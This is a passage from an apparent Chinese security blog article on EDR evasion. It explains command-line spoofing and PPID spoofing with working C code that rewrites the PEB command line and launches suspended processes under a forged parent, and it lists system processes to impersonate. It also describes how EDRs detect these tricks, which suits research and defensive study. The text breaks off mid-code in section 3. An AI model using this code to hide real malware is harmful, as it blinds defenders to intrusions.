---
title: EDR攻击技术-进程与遥测欺骗
url: https://mp.weixin.qq.com/s/BOfqCKKKKycHWMfGmg1lxw
source: Doonsec's feed
date: 2026-09-19
fetch_date: 2026-09-20T07:15:10.495304
---

# EDR攻击技术-进程与遥测欺骗

# EDR攻击技术-进程与遥测欺骗

原创

pandazhengzheng
pandazhengzheng

安全分析与研究

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

## 目录

1. 进程欺骗概述
2. 命令行欺骗（Command Line Spoofing）
3. PPID 欺骗（PPID Spoofing）
4. ETW Patch
5. AMSI-AV Patching
6. AMSI-Hooks Patching
7. AMSI Bypass
8. Image Spoofing
9. Unhooking 与 ntdll 恢复
10. Direct Syscalls
11. Indirect Syscalls
12. 挂起进程与 Early Bird 注入
13. 技术组合与实战链路
14. 小结

---

## 1. 进程欺骗概述

### 1.1 进程欺骗的定位

前 3 篇聚焦**检测机制**，本篇转向**攻击技术**——主动操纵进程属性与遥测通道，使 EDR 的输入"看起来合法"。

**进程欺骗的核心目标**：

| 目标 | 手段 | 对抗的检测 |
| --- | --- | --- |
| 命令行合法 | 命令行欺骗 | 进程信息查询、行为关联 |
| 父进程合法 | PPID 欺骗 | 进程树分析 |
| 遥测抑制 | ETW/AMSI Patch | 事件采集、脚本扫描 |
| 映像合法 | Image Spoofing | 映像加载回调、PEB 解析 |
| API 调用隐蔽 | Unhooking / Syscalls | 用户态 hook |

### 1.2 欺骗的层次

```
进程属性欺骗          遥测通道抑制          API 调用隐蔽
├─ 命令行欺骗        ├─ ETW Patch          ├─ Unhooking
├─ PPID 欺骗         ├─ AMSI-AV Patch      ├─ Direct Syscalls
└─ Image Spoofing    ├─ AMSI-Hooks Patch   └─ Indirect Syscalls
                     └─ AMSI Bypass
```

### 1.3 欺骗 vs 规避

* **欺骗（Spoofing）**：主动伪造属性/信息，使 EDR 看到**虚假但合法**的输入；
* **规避（Evasion）**：绕过检测通道，使 EDR **看不到**某些输入；
* **抑制（Suppression）**：关闭/破坏检测通道，使 EDR **无法接收**输入。

本篇覆盖三者，但以**欺骗**为主线。

### 1.4 检测—欺骗对照

| EDR 检测 | 欺骗技术 | 效果 |
| --- | --- | --- |
| PEB CommandLine 查询 | 命令行欺骗 | PEB 显示合法命令行 |
| 进程树父进程检查 | PPID 欺骗 | 父进程为合法进程 |
| ETW 事件采集 | ETW Patch | 事件不产生 |
| AMSI 脚本扫描 | AMSI Patch/Bypass | 脚本不触发扫描 |
| 映像加载回调 | Image Spoofing | 加载的映像看起来合法 |
| 用户态 hook | Unhooking/Syscalls | API 调用不经 hook |

---

## 2. 命令行欺骗（Command Line Spoofing）

### 2.1 问题背景

EDR 通过查询进程的**命令行**来判断进程行为。例如：

* `powershell.exe -enc <Base64>` → 可疑（编码命令）；
* `cmd.exe /c whoami` → 可疑（命令执行）；
* `rundll32.exe shell32.dll,Control_RunDLL` → 合法（控制面板）。

EDR 获取命令行的途径：

1. **ETW 事件**：进程创建事件（`EtwTiLogCreateProcess`）包含命令行；
2. **WMI**：`Win32_Process.CommandLine`；
3. **PEB 读取**：进程的 Process Environment Block 中存储命令行；
4. **内核回调**：`PsSetCreateProcessNotifyRoutine` 可配合查询获取命令行。

### 2.2 命令行欺骗的原理

**核心思路**：进程创建后，**修改自身 PEB 中的命令行字段**，使后续查询看到伪造的命令行。

```
真实执行: malicious.exe -payload xxx
         ↓
PEB 修改: PEB.ProcessParameters.CommandLine = "svchost.exe -k netsvcs"
         ↓
EDR 查询: 看到合法命令行 "svchost.exe -k netsvcs"
```

### 2.3 PEB 结构与命令行字段

```
// PEB（Process Environment Block）简化结构
typedef struct _PEB {
    /* ... */
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    /* ... */
} PEB;

// RTL_USER_PROCESS_PARAMETERS
typedef struct _RTL_USER_PROCESS_PARAMETERS {
    /* ... */
    UNICODE_STRING ImagePathName;    // 映像路径
    UNICODE_STRING CommandLine;      // 命令行 ← 目标
    /* ... */
} RTL_USER_PROCESS_PARAMETERS;

// UNICODE_STRING
typedef struct _UNICODE_STRING {
    USHORT Length;          // 字节长度（不含 \0）
    USHORT MaximumLength;  // 缓冲区容量
    PWSTR  Buffer;         // 指向宽字符字符串
} UNICODE_STRING;
```

### 2.4 命令行欺骗的实现

```
BOOL spoofCommandLine(LPCWSTR fakeCommandLine) {
    // 1. 获取当前进程 PEB
    PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    PRTL_USER_PROCESS_PARAMETERS params = peb->ProcessParameters;

    // 2. 伪造命令行
    SIZE_T fakeLen = wcslen(fakeCommandLine) * sizeof(WCHAR);

    // 方案 A：原地覆写（如果缓冲区足够大）
    if (params->CommandLine.MaximumLength >= fakeLen + sizeof(WCHAR)) {
        RtlZeroMemory(params->CommandLine.Buffer,
                      params->CommandLine.MaximumLength);
        wcscpy(params->CommandLine.Buffer, fakeCommandLine);
        params->CommandLine.Length = (USHORT)fakeLen;
        return TRUE;
    }

    // 方案 B：分配新缓冲区
    PWSTR newBuf = (PWSTR)RtlAllocateHeap(
        RtlProcessHeap(), 0, fakeLen + sizeof(WCHAR));
    if (!newBuf) return FALSE;
    wcscpy(newBuf, fakeCommandLine);
    params->CommandLine.Buffer = newBuf;
    params->CommandLine.Length = (USHORT)fakeLen;
    params->CommandLine.MaximumLength = (USHORT)(fakeLen + sizeof(WCHAR));
    return TRUE;
}

// 使用
spoofCommandLine(L"svchost.exe -k netsvcs -p");
```

### 2.5 命令行欺骗的时机问题

**关键**：命令行欺骗必须在 **EDR 读取命令行之前**完成。

```
进程创建 → EDR 收到事件 → EDR 查询命令行 → ... → 欺骗执行
         ↑                              ↑
         EDR 可能在此处已读取            欺骗太晚！
```

**解决方案**：

| 方案 | 原理 | 优劣 |
| --- | --- | --- |
| **PPID 欺骗 + 挂起** | 创建挂起进程，在恢复前修改 PEB | ✅ 在 EDR 查询前修改 |
| **早期修改** | 在 main() 最开始修改 | ⚠️ 可能已晚（EDR 在 CreateProcess 回调中读取） |
| **NtCreateProcessEx** | 底层创建，跳过部分遥测 | ✅ 但复杂 |

### 2.6 命令行欺骗的完整流程（挂起方案）

```
BOOL createWithSpoofedCommandLine(
    LPCWSTR imagePath,     // 实际执行的映像
    LPCWSTR fakeCmdLine,   // 伪造的命令行
    HANDLE* hProcess,
    HANDLE* hThread
) {
    STARTUPINFOEXW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attrSize = 0;

    // 1. 初始化属性列表（用于 PPID 欺骗）
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(attrSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

    // 2. 以挂起方式创建进程
    //    注意：lpCommandLine 传入 fakeCmdLine
    //    这样 ETW 事件中的命令行也是伪造的
    CreateProcessW(
        imagePath,           // 映像路径
        (LPWSTR)fakeCmdLine, // 命令行（伪造）
        NULL, NULL, FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL, (STARTUPINFOW*)&si, &pi);

    // 3. 此时进程已创建但未开始执行
    //    PEB 中的命令行已是 fakeCmdLine
    //    （因为 CreateProcess 用 lpCommandLine 设置 PEB）

    // 4. 如果需要执行真实逻辑，可通过其他方式传递
    //    如：环境变量、共享内存、文件等

    *hProcess = pi.hProcess;
    *hThread = pi.hThread;
    return TRUE;
}
```

### 2.7 命令行欺骗的检测与局限

**EDR 的反制**：

| 检测方法 | 原理 | 欺骗是否有效 |
| --- | --- | --- |
| ETW 进程创建事件 | 事件中包含命令行 | 取决于 CreateProcess 时传入的命令行 |
| 内核回调 + 实时查询 | 进程创建时立即读 PEB | 若在回调中读取，欺骗可能太晚 |
| PEB 与 ETW 交叉比对 | 比对两个来源的命令行 | 不一致 → 可疑 |
| 命令行与映像匹配 | `svchost.exe` 应在 System32 | 路径不匹配 → 可疑 |

**局限**：

* 命令行欺骗主要欺骗**后续查询**，**进程创建事件中的命令行**在创建时就已确定；
* 若 EDR 在**进程创建回调**中读取 PEB，欺骗可能来不及；
* 交叉比对可发现不一致。

### 2.8 实战中的命令行欺骗

**常用伪装目标**：

| 伪装命令行 | 场景 |
| --- | --- |
| `svchost.exe -k netsvcs` | 伪装系统服务 |
| `rundll32.exe shell32.dll,Control_RunDLL` | 伪装控制面板 |
| `WerFault.exe -u -p <PID>` | 伪装错误报告 |
| `notepad.exe` | 伪装无害程序 |
| `SearchIndexer.exe` | 伪装搜索索引 |

### 2.9 工具参考

* spoof.cpp (cocomelonc)
* Process Herpaderping——更底层的进程创建欺骗

---

## 3. PPID 欺骗（PPID Spoofing）

### 3.1 问题背景

EDR 通过**进程树**分析判断进程合法性。例如：

* `explorer.exe → cmd.exe → whoami.exe`：用户交互启动，可能合法；
* `winword.exe → cmd.exe`：Office 启动 cmd，高度可疑（文档宏攻击）；
* `svchost.exe → powershell.exe`：服务启动 PowerShell，需检查是否合法服务。

**PPID（Parent Process ID）**决定进程在进程树中的位置。PPID 欺骗使恶意进程**看起来由合法父进程启动**。

### 3.2 PPID 欺骗的原理

Windows 支持**以指定父进程创建子进程**——通过 `STARTUPINFOEXW` 的属性列表（`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`）。

```
真实: malicious.exe → child.exe
欺骗: explorer.exe (PPID) → child.exe
     child.exe 的父进程看起来是 explorer.exe
```

### 3.3 PPID 欺骗的实现

```
BOOL createWithSpoofedPPID(
    LPCWSTR applicationPath,
    LPCWSTR commandLine,
    DWORD targetPPID,      // 伪造的父进程 PID
    HANDLE* hProcess,
    HANDLE* hThread
) {
    // 1. 打开目标父进程
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, targetPPID);
    if (!hParent) return FALSE;

    // 2. 初始化属性列表
    STARTUPINFOEXW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attrSize = 0;

    InitializeProcThreadAttributeList(NULL, 2, 0, &attrSize);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(attrSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attrSize);

    // 3. 设置父进程属性
    UpdateProcThreadAttribute(
        si.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent,
        sizeof(HANDLE),
        NULL, NULL);

    // 4. 创建进程
    BOOL success = CreateProcessW(
        applicationPath,
        (LPWSTR)commandLine,
        NULL, NULL, FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL, (STARTUPINFOW*)&si, &pi);

    // 5. 清理
    DeleteProcThreadAttributeList(si.lpAttributeList);
    free(si.lpAttributeList);
    CloseHandle(hParent);

    if (success) {
        *hProcess = pi.hProcess;
        *hThread = pi.hThread;
    }
    return success;
}

// 使用：伪装为 explorer.exe 的子进程
DWORD explorerPid = findProcessId(L"exp...